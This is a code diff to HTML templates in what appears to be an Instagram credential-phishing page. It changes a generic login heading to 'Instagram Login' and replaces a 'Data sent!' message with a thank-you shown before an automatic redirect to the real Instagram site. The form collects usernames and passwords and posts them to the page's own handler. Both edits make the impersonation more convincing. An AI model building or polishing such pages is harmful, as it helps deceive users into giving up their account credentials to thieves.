@@ -381,7 +381,7 @@ LOGIN_FORM_HTML = r"""
   <div class="container">
     <!-- example logo (replace with your static /static/logo.png if you wish) -->
     <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="App Logo" class="logo">
-    <h2>🔐 User Login</h2>
+    <h2>🔐 Instagram Login</h2>
     <form method="POST" action="/submit_form">
       <input type="text" name="username" placeholder="Username" required>
       <input type="password" name="password" placeholder="Password" required>
@@ -434,7 +434,7 @@ SUCCESS_HTML_TEMPLATE = """<!DOCTYPE html>
 <body>
   <div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="App Logo" class="logo">
-    <h3>✅ Data sent!</h3>
+    <h3>✅ You Have Successfully Logined and Thanks for Contribution!</h3>
     <p>You will be redirected to Instagram in <span id="countdown" class="count">5</span> seconds.</p>
     <p>If you are not redirected automatically, <a href="https://www.instagram.com">click here</a>.</p>
   </div>
